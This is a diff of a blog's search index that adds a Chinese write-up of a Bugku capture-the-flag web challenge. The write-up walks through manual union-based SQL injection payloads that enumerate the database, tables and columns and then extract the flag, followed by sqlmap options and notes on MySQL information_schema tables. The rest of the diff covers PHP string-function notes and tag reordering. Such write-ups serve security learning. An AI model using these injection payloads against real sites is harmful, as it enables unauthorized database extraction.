@@ -1,6 +1,21 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Bugku-成绩单]]></title>
+    <url>%2F2019%2F02%2F01%2F201931%2F</url>
+    <content type="text"><![CDATA[成绩单-writeup打开题目访问链接，根据上面提示分别输入1,2,3查询下尝试输入1’返回异常，输入1’#返回正常，判断存在注入尝试手动注入利用order by 判断列数为4列11'order by 4 # 返回正常 11'order by 5 # 返回异常 12利用联合查询查看显位payload:-1'union select 1,2,3,4 # 12爆库名paylaod:-1'union select 1,database(),3,4 # 12爆表名payload:-1'union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()# 12爆字段payload:-1'union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name='fl4g'# 123查询数据payload:-1'union select 1,group_concat(skctf_flag),3,4 from fl4g#![](https://i.imgur.com/QLw5GOG.png) 还可以使用sqlmap进行burp suite抓包，右键保存文件将文本放在sqlmap的当前目录下，打开sqlmap爆库爆表名爆字段爆字段信息1234567891011-r 是读文件 后面是刚才保存的绝对路径-p 是参数，也就是注入点（选了id是注入点）-D 是表示选择了后面的这个数据库 -T 指定表-C 指定要爆的字段--dbs –&gt;获取数据库名字--current-db –&gt;获取当前数据库名称--tables –&gt;获取表--columns –&gt;获取字段--dump –&gt;将结果导出 1234567891011121314151617181920212223242526272829303132333435Mysql数据库information_schema系统表说明:SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。COLLATIONS表：提供了关于各字符集的对照信息。COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。KEY_COLUMN_USAGE表：描述了具有约束的键列。ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表详情可以点击:https://wenku.baidu.com/view/6358a5fd89eb172ded63b7a8.html]]></content>
+      <categories>
+        <category>Bugku</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Writeup</tag>
+        <tag>CTF</tag>
+        <tag>SQL注入，Mysql</tag>
+        <tag>sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[PHP语法]]></title>
     <url>%2F2019%2F01%2F31%2F201930%2F</url>
     <content type="text"><![CDATA[php语法strstr() 函数搜索字符串在另一字符串中的第一次出现。语法strstr(string,search,before_search) 参数 描述 string 必需。规定被搜索的字符串。 search 必需。规定所搜索的字符串。如果此参数是数字，则搜索匹配此数字对应的 ASCII 值的字符。 before_search 可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分。 实例:123&lt;?phpecho strstr("axiaowei.cn?key1=1",'?');?&gt; substr() 函数返回字符串的一部分。语法substr(string,start,length) 参数 描述 string 必需。规定要返回其中一部分的字符串。 start 必需。规定在字符串的何处开始。正数-在字符串的指定位置开始负数-在从字符串结尾开始的指定位置开始。0-在字符串中的第一个字符处开始 length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数-从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度 实例123&lt;?phpecho substr("www.axiaowei.cn",4);?&gt; str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。语法str_replace(find,replace,string,count) 参数 描述 find 必需。规定要查找的值 replace 必需。规定替换find中的值的值 string 必需。规定被搜索的字符串 count 可选。对替换数进行计数的变量 实例123&lt;?phpecho str_replace("world","xiaowei blog","Hello world!");?&gt; parse_str() 函数把查询字符串解析到变量中。语法parse_str(string,array) 参数 描述 string 必需。规定解析的字符串 array 可选。规定存储变量的数组名称。该参数指示变量将被存储到数组中 实例123456&lt;?phpparse_str("key1=xiaowei&amp;key2=2019");echo $key1;echo "\n";echo $key2;?&gt; $_SERVER[“REQUEST_URI”]函数1234567$_SERVER["REQUEST_URI"]函数预定义服务器变量的一种，所有$_SERVER开头的都叫做预定义服务器变量 REQUEST_URI的作用是取得当前URI，也就是除域名外后面的完整的地址路径例如：当前页面是http://www.axiaowei.cn/plus/search.php?kwtype=0&amp;keyword=php&amp;searchtype=titlekeywordecho $_SERVER["REQUEST_URI"];结果就为：plus/search.php?kwtype=0&amp;keyword=php&amp;searchtype=titlekeyword]]></content>
@@ -252,8 +267,8 @@
         <tag>MISC</tag>
         <tag>Python</tag>
         <tag>加密</tag>
-        <tag>ZIP</tag>
         <tag>爆破</tag>
+        <tag>ZIP</tag>
       </tags>
   </entry>
   <entry>
@@ -308,8 +323,8 @@
       </categories>
       <tags>
         <tag>Web</tag>
-        <tag>CBC</tag>
         <tag>加密</tag>
+        <tag>CBC</tag>
       </tags>
   </entry>
   <entry>
